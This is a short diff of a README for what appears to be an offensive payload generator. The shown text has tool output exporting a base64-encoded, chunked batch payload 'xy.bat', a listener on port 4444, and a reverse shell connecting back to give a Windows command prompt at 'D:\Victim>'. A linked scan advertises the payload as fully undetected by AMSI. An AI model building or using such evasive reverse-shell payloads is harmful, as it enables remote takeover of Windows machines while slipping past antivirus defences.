@@ -59,6 +59,14 @@ Host set to "LukeProuctsKali" (192.168.0.129)
 
 [*] Successfully exported payload to "xy.bat" with encoding base64 and chunked up 87 times!
 listening on [any] 4444 ...
+connect to [192.168.0.129] from (UNKNOWN) [192.168.0.129] 1716
+Microsoft Windows [Version 10.0.19042.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+D:\Victim>
+```
+```diff
+- gsdf
 ```
 ### xy.bat: <a href="https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1">fully undetected AMSI Scan Result</a>
 ```
